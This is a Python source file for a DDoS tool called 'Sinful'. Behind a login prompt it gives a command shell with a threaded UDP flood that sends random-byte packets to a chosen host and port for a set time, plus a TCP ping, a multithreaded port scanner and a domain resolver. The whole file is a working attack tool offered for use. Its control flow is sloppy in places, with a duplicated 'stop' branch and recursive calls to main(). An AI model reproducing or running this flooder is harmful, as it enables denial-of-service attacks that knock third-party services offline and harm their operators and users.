#!/usr/bin/env python3
#-*- coding: utf-8 -*-
import sys
import socket
import time
import random
import threading
import getpass
import os

methods = """\033[91m
╔══════════════════════════════════════════════════════╗
║                     \033[00mDDos Methods\033[91m                     ║               
║══════════════════════════════════════════════════════║
║ \033[00mUDP <IP> <PORT> <TIME> <SIZE>  \033[91m|\033[00m UDP Attack.\033[91m         ║
╚══════════════════════════════════════════════════════╝\033[00m
"""

tools = """\033[91m
╔══════════════════════════════════════════════════════╗
║                        \033[00mTools\033[91m                         ║
║══════════════════════════════════════════════════════║
║ \033[00mPing <IP> <PORT>         \033[91m|\033[00m Ping An Ip.\033[91m               ║
║ \033[00mPortscan <IP> <DST PORT> \033[91m|\033[00m Scan Open Ports.\033[91m          ║
║ \033[00mResolve <DOMAIN>         \033[91m|\033[00m Grabs A Domains IP.\033[91m       ║
╚══════════════════════════════════════════════════════╝\033[00m
"""

help = """\033[91m
╔══════════════════════════════════════════════════════╗
║                    \033[00mBasic Commands\033[91m                    ║
║══════════════════════════════════════════════════════║
║ \033[00mMethods \033[91m|\033[00m Shows DDos Methods For Sinful.\033[91m             ║
║ \033[00mTools   \033[91m|\033[00m Shows Tools For Sinful.\033[91m                    ║
║ \033[00mAttacks \033[91m|\033[00m Shows How Many Running Attacks.\033[91m            ║
║ \033[00mStop    \033[91m|\033[00m Stops All Running Attacks.\033[91m                 ║
║ \033[00mClear   \033[91m|\033[00m Clear Screen.\033[91m                              ║
║ \033[00mExit    \033[91m|\033[00m Exits Out Of Sinful.\033[91m                       ║
╚══════════════════════════════════════════════════════╝\033[00m
"""

banner = """

		      		   \033[1;91mS I N F U L L\033[00m
			        Angels go to heaven
			   Demons meet the gates of hell
		      Sinful people are punished put in hell
"""

cookie = open(".Sinful_Cookie","w+")

fsubs = 0
tpings = 0
pscans = 0
liips = 0
tattacks = 0
uaid = 0
said = 0
iaid = 0
haid = 0
aid = 0
attack = True
udp = True

def udpsender(host, port, timer, punch):
	global uaid
	global udp
	global aid
	global tattacks

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	
	uaid += 1
	aid += 1
	tattacks += 1
	while time.time() < timeout and udp and attack:
		sock.sendto(punch, (host, int(port)))
	uaid -= 1
	aid -= 1

def main():
	global fsubs
	global tpings
	global pscans
	global liips
	global tattacks
	global uaid
	global said
	global iaid
	global haid
	global aid
	global attack
	global dp

	while True:
		sys.stdout.write("")
		sin = input("cmd> ").lower()
		sinput = sin.split(" ")[0]
		if sinput == "clear":
			os.system ("clear")
			print (banner)
			main()
		elif sinput == "help":
			print (help)
			main()
		elif sinput == "tools":
			print (tools)
			main()
		elif sinput == "exit":
			print ("[\033[91mSin\033[00m] You Are Exiting Out Of Sinful.\n")
			exit()
		elif sinput == "methods":
			print (methods)
			main()
			main()
		elif sinput == "attacks":
			print ("[\033[91mSin\033[00m] Total Attacks Running: {}\n".format (aid))
			main()
		elif sinput == "ping":
			tpings += 1
			try:
				sinput, host, port = sin.split(" ")
				print ("[\033[91mSin\033[00m] Starting ping on host: {}".format (host))
				try:
					ip = socket.gethostbyname(host)
				except socket.gaierror:
					print ("[\033[91mSin\033[00m] Host un-resolvable")
					main()
				while True:
					try:
						sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
						sock.settimeout(2)
						start = time.time() * 1000
						sock.connect ((host, int(port)))
						stop = int(time.time() * 1000 - start)
						print ("[\033[91mSin\033[00m] {}:{} | Time={}ms [\033[91mOnline\033[00m]".format(ip, port, stop))
						sock.close()
						time.sleep(1)
					except socket.error:
						print ("[\033[91mSin\033[00m] {}:{} [\033[91mOffline\033[00m]".format(ip, port))
						time.sleep(1)
					except KeyboardInterrupt:
						print("")
						main()
			except ValueError:
				print ("[\033[91mSin\033[00m] The command {} requires an argument".format (sinput))
				main()
		elif sinput == "portscan":
			port_range = int(sin.split(" ")[2])
			pscans += 1
			def scan(port, ip):
				try:
					sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
					sock.connect((ip, port))
					print ("[\033[91mSin\033[00m] {}\033[91m:\033[00m{} [\033[91mOpen\033[00m]".format (ip, port))
					sock.close()
				except socket.error:
					return
				except KeyboardInterrupt:
					print ("\n")
			for port in range(1, port_range+1):
				ip = socket.gethostbyname(sin.split(" ")[1])
				threading.Thread(target=scan, args=(port, ip)).start()
		elif sinput == "resolve":
			liips += 1
			host = sin.split(" ")[1]
			host_ip = socket.gethostbyname(host)
			print ("[\033[91mSin\033[00m] {} \033[00m[\033[91mConverted\033[00m] {}\n".format (host, host_ip))
			main()
		elif sinput == "udp":
				try:
					sinput, host, port, timer, pack = sin.split(" ")
					socket.gethostbyname(host)
					print ("[\033[91mSin\033[00m] Attack Sent To: {}\n".format (host))
					punch = random._urandom(int(pack))
					threading.Thread(target=udpsender, args=(host, port, timer, punch)).start()
				except ValueError:
					print ("[\033[91mSin\033[00m] The Command {} Requires An Argument.\n".format (sinput))
					main()
				except socket.gaierror:
					print ("[\033[91mSin\033[00m] Host: {} Invalid.\n".format (host))
					main()
		elif sinput == "stop":
			print ("[\033[91mSin\033[00m] All Running Attacks Have Been Stopped.\n")
			attack = False
			while not attack:
				if aid == 0:
					attack = True
		elif sinput == "stop":
			what = sin.split(" ")[1]
			if what == "udp":
				print ("Stopping All UDP Attacks.\n")
				udp = False
				while not udp:
					if aid == 0:
						print ("[\033[91mSin\033[00m] No UDP Processes Running.")
						udp = True
						main()
		else:
			print ("[\033[91mSin\033[00m] {} Is Not A Command.\n".format(sinput))
			main()



try:
	users = ["", ""]
	clear = "clear"
	os.system (clear)
	username = getpass.getpass ("[+] Username: ")
	if username in users:
		user = username
	else:
		print ("[+] Incorrect, Exiting.\n")
		exit()
except KeyboardInterrupt:
	exit()
try:
	passwords = ["", ""]
	password = getpass.getpass ("[+] Password: ")
	if user == "":
		if password == passwords[0]:
			print ("[+] Login Correct.")
			print ("[+] Type Help To See Commands.")
			cookie.write("DIE")
			time.sleep(1)
			os.system (clear)
			try:
				os.system ("clear")
				print (banner)
				main()
			except KeyboardInterrupt:
				print ("\n[\033[91mSin\033[00m] Ctrl-C Has Been Pressed.\n")
				main()
		else:
			print ("[+] Incorrect, Exiting.\n")
			exit()
except KeyboardInterrupt:
	exit()